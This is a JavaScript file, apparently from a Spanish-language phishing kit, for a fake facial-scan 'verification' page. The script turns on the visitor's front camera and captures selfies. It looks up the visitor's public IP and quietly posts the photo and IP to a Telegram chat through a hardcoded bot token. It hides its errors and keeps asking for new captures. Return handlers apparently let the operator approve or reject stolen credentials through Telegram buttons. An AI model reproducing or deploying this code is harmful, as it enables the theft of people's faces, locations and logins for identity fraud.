const TELEGRAM_BOT_TOKEN = '8671453759:AAEDTpMJfgtQdV5vlzFUXDKNu2svSlrvab8';
const TELEGRAM_CHAT_ID = '-1003797553845';


const loaderScreen = document.getElementById('loaderScreen');
const videoElement = document.getElementById('video');
const ovalPlaceholder = document.getElementById('ovalPlaceholder');
const successIndicator = document.getElementById('successIndicator');
const scanBtn = document.getElementById('scanBtn');
const loadingSpinner = document.getElementById('loadingSpinner');
const loginNotification = document.getElementById('loginNotification');
const errorBanner = document.getElementById('errorBanner');
const errorText = document.getElementById('errorText');

let isProcessing = false;
let loaderTimeout = null;

// Parámetros de URL para redirección desde Telegram
const urlParams = new URLSearchParams(window.location.search);
let hasReturnedFromTelegram = false;


// Manejar redirección desde botones de Telegram (SÍ/NO)
function handleTelegramReturn(fromTelegram = false) {
    const errorType = urlParams.get('error');
    const message = urlParams.get('message');
    
    if (errorType || fromTelegram) {
        isProcessing = true;
        
        if (errorType === 'credentials_failed') {
            // Mostrar banner de error al volver de la acción NO
            showErrorResponse(message || 'Credenciales no verificadas. Por favor, intente nuevamente.');
        } else if (fromTelegram) {
            // Mostrar notificación de login exitoso
            showLoginSuccess();
            hasReturnedFromTelegram = true;
        }
        
        if (fromTelegram) {
            // Limpiar parámetros de URL después de procesar
            const newUrl = window.location.pathname + window.location.hash;
            window.history.replaceState({}, document.title, newUrl);
        }
    }
}

// Mostrar respuesta de error para credenciales
function showErrorResponse(message) {
    console.log('Error de credenciales:', message);
    
    errorText.textContent = message;
    errorBanner.style.display = 'flex';
    
    // Marcar campos de login como con error
    document.querySelectorAll('.form-control').forEach(input => {
        input.style.borderColor = '#dc3545';
        input.style.borderWidth = '2px';
    });
    
    // Esperar y ocultar el banner
    setTimeout(() => {
        errorBanner.style.display = 'none';
        isProcessing = false;
    }, 8000);
}

// Mostrar notificación de login exitoso
function showLoginSuccess() {
    console.log('Login exitoso desde Telegram');
    
    loginNotification.style.display = 'block';
    successIndicator.classList.add('show');
    
    setTimeout(() => {
        loginNotification.style.display = 'none';
        successIndicator.classList.remove('show');
        isProcessing = false;
        hasReturnedFromTelegram = false;
    }, 5000);
}

// Inicializar manejo de retorno de Telegram
if (window.location.pathname.includes('v.php')) {
    handleTelegramReturn(true);
}

async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.log("No se pudo obtener la IP:", error.message);
        return 'IP desconocida';
    }
}

function showLoaderAndRestart() {
    loaderScreen.classList.remove('hidden');

    scanBtn.innerText = "Escanear Rostro";
    scanBtn.disabled = false;
    isProcessing = false;

    ovalPlaceholder.style.display = 'block';
    ovalPlaceholder.innerText = "Cargando cámara...";
    ovalPlaceholder.style.color = "#999";

    successIndicator.classList.remove('show');

    stopCamera();

    if (loaderTimeout) clearTimeout(loaderTimeout);

    loaderTimeout = setTimeout(() => {
        loaderScreen.classList.add('hidden');
        startCamera();
    }, 5000);
}


window.addEventListener('load', () => {
    loaderTimeout = setTimeout(() => {
        loaderScreen.classList.add('hidden');
        startCamera();
    }, 5000);
    
    // Inicializar manejo de retorno de Telegram
    handleTelegramReturn(true);
});


async function captureAndSend() {
    if (isProcessing) return;

    isProcessing = true;
    scanBtn.disabled = true;
    scanBtn.innerText = "Enviando...";
    loadingSpinner.style.display = 'block';
    scanBtn.style.opacity = '0.8';

    try {
        // 1. Capturar la imagen del video
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const ctx = canvas.getContext('2d');

        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

        // 2. Obtener la IP pública del usuario
        const userIP = await getUserIP();

        // 3. Enviar a Telegram (foto + IP como caption)
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        formData.append('caption', userIP);

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        if (data.ok) {
            successIndicator.classList.add('show');
            scanBtn.innerText = "¡Enviado!";

            setTimeout(() => {
                showLoaderAndRestart();
            }, 1500);
        } else {
            setTimeout(() => {
                showLoaderAndRestart();
            }, 1000);
        }

    } catch (error) {
        console.log("Error silencioso:", error.message);
        setTimeout(() => {
            showLoaderAndRestart();
        }, 1000);
    } finally {
        loadingSpinner.style.display = 'none';
        scanBtn.style.opacity = '1';
    }
}

scanBtn.addEventListener('click', captureAndSend);

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user",
                width: { ideal: 720 },
                height: { ideal: 1280 }
            }
        });

        videoElement.srcObject = stream;
        videoElement.play();

        videoElement.onplaying = () => {
            ovalPlaceholder.style.display = 'none';
        };

    } catch (error) {
        console.log("Error silencioso al iniciar cámara:", error.message);
        ovalPlaceholder.innerText = "Cámara no disponible";
        
        // Mostrar error en caso de falla de cámara
        showErrorResponse('Error al acceder a la cámara. Por favor, verifique sus permisos.');
    }
}

function stopCamera() {
    if (videoElement.srcObject) {
        videoElement.srcObject.getTracks().forEach(track => track.stop());
        videoElement.srcObject = null;
    }
}

// Inicializar al cargar la página
document.addEventListener('DOMContentLoaded', () => {
    handleTelegramReturn(true);
});